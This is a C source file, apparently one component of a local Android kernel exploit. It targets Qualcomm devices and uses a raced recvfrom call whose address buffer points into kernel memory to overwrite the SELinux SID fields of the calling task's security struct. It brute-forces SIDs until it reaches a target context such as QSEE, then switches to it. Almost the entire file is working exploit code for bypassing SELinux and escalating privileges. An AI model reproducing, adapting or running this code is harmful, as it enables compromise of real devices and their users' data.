#define _GNU_SOURCE
#include "selinux_handoff.h"

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/un.h>
#include <unistd.h>

#define SIDTAB_STATS_PATH "/sys/fs/selinux/ss/sidtab_hash_stats"
#define INITIAL_CONTEXTS_PATH "/sys/fs/selinux/initial_contexts"
/* task_security_struct stores exec_sid and fscreate SID at these offsets. */
#define TASK_SECURITY_EXEC_SID_OFFSET 8
#define SID_PAIR_WRITE_SIZE 8

struct sender_args {
    struct selinux_handoff_state *state;
    const cpu_set_t *allowed_cpus;
    int park_cpu;
};

static int is_kernel_address(uint64_t value)
{
    return (value & 0xffff000000000000ULL) == 0xffff000000000000ULL;
}

static int parse_pid(const char *name, pid_t *pid_out)
{
    unsigned long value = 0;

    if (!name || !*name)
        return 0;
    for (const unsigned char *p = (const unsigned char *)name; *p; p++) {
        if (*p < '0' || *p > '9')
            return 0;
        value = value * 10 + (unsigned long)(*p - '0');
        if (value > 0x7fffffffUL)
            return 0;
    }
    if (value < 2)
        return 0;
    *pid_out = (pid_t)value;
    return 1;
}

static int read_process_attribute(pid_t pid, const char *attribute,
                                  char *buffer, size_t capacity)
{
    char path[96];
    int n;

    if (pid <= 1 || !attribute || !*attribute || !buffer || capacity < 2) {
        errno = EINVAL;
        return -1;
    }
    for (const unsigned char *p = (const unsigned char *)attribute; *p; p++) {
        if (!((*p >= 'a' && *p <= 'z') || *p == '_')) {
            errno = EINVAL;
            return -1;
        }
    }
    n = snprintf(path, sizeof(path), "/proc/%d/attr/%s", (int)pid,
                 attribute);
    if (n < 0 || (size_t)n >= sizeof(path)) {
        errno = EOVERFLOW;
        return -1;
    }

    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return -1;
    ssize_t got;
    do {
        got = read(fd, buffer, capacity - 1);
    } while (got < 0 && errno == EINTR);
    int saved_errno = errno;
    close(fd);
    errno = saved_errno;
    if (got < 0)
        return -1;

    while (got > 0 && (buffer[got - 1] == '\0' || buffer[got - 1] == '\n'))
        got--;
    buffer[got] = '\0';
    return 0;
}

static int read_process_context(pid_t pid, char *buffer, size_t capacity)
{
    if (read_process_attribute(pid, "current", buffer, capacity) < 0)
        return -1;
    if (!buffer[0]) {
        errno = EIO;
        return -1;
    }
    return 0;
}

pid_t selinux_handoff_find_pid(const char *context)
{
    if (!context || !*context) {
        errno = EINVAL;
        return -1;
    }

    DIR *proc = opendir("/proc");
    if (!proc)
        return -1;

    pid_t found = -1;
    int read_error = 0;
    struct dirent *entry;
    while ((entry = readdir(proc)) != NULL) {
        pid_t pid;
        if (!parse_pid(entry->d_name, &pid))
            continue;
        char current[256];
        if (read_process_context(pid, current, sizeof(current)) < 0) {
            if (!read_error)
                read_error = errno;
            continue;
        }
        if (strcmp(current, context) == 0) {
            found = pid;
            break;
        }
    }
    int saved_errno = found >= 0 ? 0 : read_error ? read_error : ESRCH;
    closedir(proc);
    errno = saved_errno;
    return found;
}

int selinux_handoff_pid_has_attribute_context(pid_t pid, const char *attribute,
                                              const char *expected)
{
    if (pid <= 1 || !attribute || !*attribute || !expected) {
        errno = EINVAL;
        return -1;
    }
    char current[256];
    if (read_process_attribute(pid, attribute, current, sizeof(current)) < 0)
        return -1;
    if (strcmp(current, expected) != 0) {
        errno = ESTALE;
        return -1;
    }
    return 0;
}

int selinux_handoff_pid_has_context(pid_t pid, const char *expected)
{
    return selinux_handoff_pid_has_attribute_context(pid, "current", expected);
}

int selinux_handoff_verify_context(const char *expected)
{
    if (!expected || !*expected) {
        errno = EINVAL;
        return -1;
    }
    return selinux_handoff_pid_has_context(getpid(), expected);
}

static int read_sid_limit(uint32_t *sid_limit)
{
    char stats[256] = {0};
    int fd = open(SIDTAB_STATS_PATH, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return -1;
    ssize_t got;
    do {
        got = read(fd, stats, sizeof(stats) - 1);
    } while (got < 0 && errno == EINTR);
    int saved_errno = errno;
    close(fd);
    errno = saved_errno;
    if (got <= 0) {
        if (got == 0)
            errno = EIO;
        return -1;
    }

    char *entries_line = strstr(stats, "entries:");
    if (!entries_line) {
        errno = EPROTO;
        return -1;
    }
    entries_line += sizeof("entries:") - 1;
    while (*entries_line == ' ' || *entries_line == '\t')
        entries_line++;
    char *end = NULL;
    errno = 0;
    unsigned long entries = strtoul(entries_line, &end, 10);
    if (errno || end == entries_line || entries == 0 || entries > 0x100000UL) {
        errno = EOVERFLOW;
        return -1;
    }

    DIR *initial_contexts = opendir(INITIAL_CONTEXTS_PATH);
    if (!initial_contexts)
        return -1;
    uint32_t initial_count = 0;
    struct dirent *entry;
    errno = 0;
    while ((entry = readdir(initial_contexts)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
            continue;
        if (initial_count == 0x100000U) {
            closedir(initial_contexts);
            errno = EOVERFLOW;
            return -1;
        }
        initial_count++;
    }
    int read_error = errno;
    closedir(initial_contexts);
    if (read_error) {
        errno = read_error;
        return -1;
    }
    if (!initial_count || entries + initial_count > 0x100000UL) {
        errno = EOVERFLOW;
        return -1;
    }

    /* This bounds dynamic SIDs plus the highest possible initial SID. */
    *sid_limit = (uint32_t)(entries + initial_count);
    return 0;
}

static int futex_wait_int(volatile int *word, int expected)
{
    return (int)syscall(SYS_futex, (int *)word, FUTEX_WAIT, expected,
                        NULL, NULL, 0);
}

static int futex_wake_int(volatile int *word)
{
    return (int)syscall(SYS_futex, (int *)word, FUTEX_WAKE, INT32_MAX,
                        NULL, NULL, 0);
}

static int migrate_main_thread(const struct sender_args *args)
{
    cpu_set_t current;
    CPU_ZERO(&current);
    if (sched_getaffinity(args->state->main_tid, sizeof(current), &current) < 0)
        return -1;

    for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
        if (!CPU_ISSET(cpu, args->allowed_cpus) || CPU_ISSET(cpu, &current))
            continue;
        cpu_set_t target;
        CPU_ZERO(&target);
        CPU_SET(cpu, &target);
        if (sched_setaffinity(args->state->main_tid, sizeof(target), &target) == 0)
            return 0;
    }

    if (args->park_cpu >= 0 && CPU_ISSET(args->park_cpu, args->allowed_cpus)) {
        cpu_set_t target;
        CPU_ZERO(&target);
        CPU_SET(args->park_cpu, &target);
        return sched_setaffinity(args->state->main_tid, sizeof(target), &target);
    }
    errno = ENODEV;
    return -1;
}

static int send_source_address(struct selinux_handoff_state *state,
                               uint32_t sid)
{
    int fd = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (fd < 0)
        return -1;

    struct sockaddr_un source;
    memset(&source, 0, sizeof(source));
    source.sun_family = AF_UNIX;
    source.sun_path[0] = '\0';
    source.sun_path[1] = '\0';
    memcpy(&source.sun_path[2], &sid, sizeof(sid));
    /* family + two NUL bytes + SID yields osid=1 and sid=the candidate. */
    socklen_t source_length = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 6);
    if (bind(fd, (const struct sockaddr *)&source, source_length) < 0) {
        int saved_errno = errno;
        close(fd);
        errno = saved_errno;
        return -1;
    }

    struct sockaddr_un destination;
    memset(&destination, 0, sizeof(destination));
    destination.sun_family = AF_UNIX;
    memcpy(destination.sun_path, state->receiver_name,
           sizeof(state->receiver_name));
    char byte = 'S';
    ssize_t sent;
    do {
        sent = sendto(fd, &byte, sizeof(byte), 0,
                      (const struct sockaddr *)&destination,
                      state->receiver_address_length);
    } while (sent < 0 && errno == EINTR);
    int saved_errno = errno;
    close(fd);
    errno = saved_errno;
    if (sent != (ssize_t)sizeof(byte)) {
        if (sent >= 0)
            errno = EIO;
        return -1;
    }
    return 0;
}

static void *handoff_sender(void *opaque)
{
    struct sender_args *args = opaque;
    struct selinux_handoff_state *state = args->state;

    for (;;) {
        if (state->helper_exit)
            break;
        if (!state->io_active) {
            (void)futex_wait_int(&state->io_active, 0);
            continue;
        }
        if (!state->migration_done) {
            state->migration_status =
                migrate_main_thread(args) == 0 ? 0 : (errno ? errno : EIO);
            __sync_synchronize();
            state->migration_done = 1;
            futex_wake_int(&state->migration_done);
        }
        if (!state->io_released) {
            (void)futex_wait_int(&state->io_released, 0);
            continue;
        }
        if (state->helper_sent) {
            (void)futex_wait_int(&state->io_active, 1);
            continue;
        }

        __sync_synchronize();
        if (send_source_address(state, state->io_candidate_sid) < 0)
            state->helper_status = errno ? errno : EIO;
        else
            state->helper_status = 0;
        __sync_synchronize();
        state->helper_sent = 1;
        futex_wake_int(&state->helper_sent);

        if (state->helper_exit_after_send)
            break;
        while (state->io_active && !state->helper_exit)
            (void)futex_wait_int(&state->io_active, 1);
    }

    __sync_synchronize();
    state->helper_done = 1;
    futex_wake_int(&state->helper_done);
    return NULL;
}

static int prepare_receiver(struct selinux_handoff_state *state)
{
    int fd = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (fd < 0)
        return -1;

    struct timeval timeout = {.tv_sec = 2, .tv_usec = 0};
    if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
        int saved_errno = errno;
        close(fd);
        errno = saved_errno;
        return -1;
    }

    memset(state->receiver_name, 0, sizeof(state->receiver_name));
    state->receiver_name[0] = '\0';
    int n = snprintf(state->receiver_name + 1,
                     sizeof(state->receiver_name) - 1,
                     "kgsl-sid-%d", (int)getpid());
    if (n < 0 || (size_t)n >= sizeof(state->receiver_name) - 1) {
        close(fd);
        errno = EOVERFLOW;
        return -1;
    }
    state->receiver_address_length =
        (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + (size_t)n);

    struct sockaddr_un address;
    memset(&address, 0, sizeof(address));
    address.sun_family = AF_UNIX;
    memcpy(address.sun_path, state->receiver_name,
           sizeof(state->receiver_name));
    if (bind(fd, (const struct sockaddr *)&address,
             state->receiver_address_length) < 0) {
        int saved_errno = errno;
        close(fd);
        errno = saved_errno;
        return -1;
    }
    state->receiver_fd = fd;
    return 0;
}

static int request_sid_write(struct selinux_handoff_state *state,
                             int operation, uint32_t sid,
                             uint64_t destination_offset)
{
    char payload = 0;
    socklen_t address_length = SID_PAIR_WRITE_SIZE;
    struct sockaddr *destination = (struct sockaddr *)(uintptr_t)
        (state->current_security + destination_offset);

    if (state->abort_requested) {
        errno = ECANCELED;
        return -1;
    }
    state->io_operation = operation;
    state->io_candidate_sid = sid;
    state->io_status = EINPROGRESS;
    state->helper_status = EINPROGRESS;
    state->candidate_result = 0;
    state->candidate_done = 0;
    state->candidate_ack = 0;
    state->helper_sent = 0;
    state->io_released = 0;
    state->migration_done = 0;
    state->migration_status = EINPROGRESS;
    __sync_synchronize();
    state->io_active = 1;
    futex_wake_int(&state->io_active);

    ssize_t received;
    do {
        received = recvfrom(state->receiver_fd, &payload, sizeof(payload), 0,
                            destination, &address_length);
    } while (received < 0 && errno == EINTR);
    if (received == (ssize_t)sizeof(payload) &&
        address_length == SID_PAIR_WRITE_SIZE) {
        state->io_status = 0;
    } else if (received < 0) {
        state->io_status = errno ? errno : EIO;
    } else {
        state->io_status = EIO;
    }

    __sync_synchronize();
    state->io_active = 0;
    state->candidate_done = 1;
    futex_wake_int(&state->io_active);

    while (!state->candidate_ack)
        (void)futex_wait_int(&state->candidate_ack, 0);
    __sync_synchronize();
    state->candidate_done = 0;

    if (state->candidate_result < 0) {
        errno = -state->candidate_result;
        return -1;
    }
    return state->candidate_result;
}

static void stop_sender(struct selinux_handoff_state *state)
{
    state->helper_exit = 1;
    futex_wake_int(&state->io_active);
    futex_wake_int(&state->io_released);
    while (!state->helper_done)
        __asm__ volatile("yield" ::: "memory");
}

int selinux_handoff_patch_child(struct selinux_handoff_state *state,
                                const struct target_profile *profile,
                                const cpu_set_t *allowed_cpus,
                                int park_cpu)
{
    if (!state || !profile || !profile->qsee_context ||
        !profile->task_addr_limit ||
        !is_kernel_address(state->current_security) ||
        (state->current_security & 7ULL) || !allowed_cpus) {
        errno = EINVAL;
        return -1;
    }

    int result = -1;
    int saved_errno = EIO;
    pthread_t sender;
    int sender_started = 0;
    struct sender_args args = {
        .state = state,
        .allowed_cpus = allowed_cpus,
        .park_cpu = park_cpu,
    };

    state->receiver_fd = -1;
    state->stage = 1;
    if (read_sid_limit(&state->sid_limit) < 0) {
        saved_errno = errno ? errno : EIO;
        goto out;
    }
    printf("[*] probing SELinux SIDs 1..%u\n", state->sid_limit);
    if (prepare_receiver(state) < 0) {
        saved_errno = errno ? errno : EIO;
        goto out;
    }

    state->main_tid = (pid_t)syscall(SYS_gettid);
    state->helper_done = 0;
    state->helper_exit = 0;
    state->helper_exit_after_send = 0;
    int thread_error = pthread_create(&sender, NULL, handoff_sender, &args);
    if (thread_error != 0) {
        saved_errno = thread_error;
        goto out;
    }
    sender_started = 1;
    thread_error = pthread_detach(sender);
    if (thread_error != 0) {
        saved_errno = thread_error;
        goto out;
    }

    state->stage = 2;
    for (uint32_t sid = 1; sid <= state->sid_limit; sid++) {
        state->probe_index = sid;
        int probe = request_sid_write(
            state, SELINUX_HANDOFF_IO_PROBE, sid,
            TASK_SECURITY_EXEC_SID_OFFSET);
        if (probe < 0) {
            saved_errno = errno ? errno : EIO;
            goto out;
        }
        if (probe == 1) {
            state->target_sid = sid;
            break;
        }
        if (state->abort_requested) {
            saved_errno = ECANCELED;
            goto out;
        }
    }
    if (!state->target_sid) {
        saved_errno = ENOENT;
        goto out;
    }

    state->stage = 3;
    if (request_sid_write(state, SELINUX_HANDOFF_IO_CLEAR, 0,
                          TASK_SECURITY_EXEC_SID_OFFSET) < 0) {
        saved_errno = errno ? errno : EIO;
        goto out;
    }

    state->stage = 4;
    state->helper_exit_after_send = 1;
    if (request_sid_write(state, SELINUX_HANDOFF_IO_ACTIVATE,
                          state->target_sid, 0) < 0) {
        saved_errno = errno ? errno : EIO;
        goto out;
    }
    while (!state->helper_done)
        __asm__ volatile("yield" ::: "memory");
    result = 0;

out:
    if (sender_started && !state->helper_done)
        stop_sender(state);
    if (state->receiver_fd >= 0) {
        close(state->receiver_fd);
        state->receiver_fd = -1;
    }
    if (result == 0) {
        state->stage = 0;
        return 0;
    }
    state->status = saved_errno;
    errno = saved_errno;
    return -1;
}
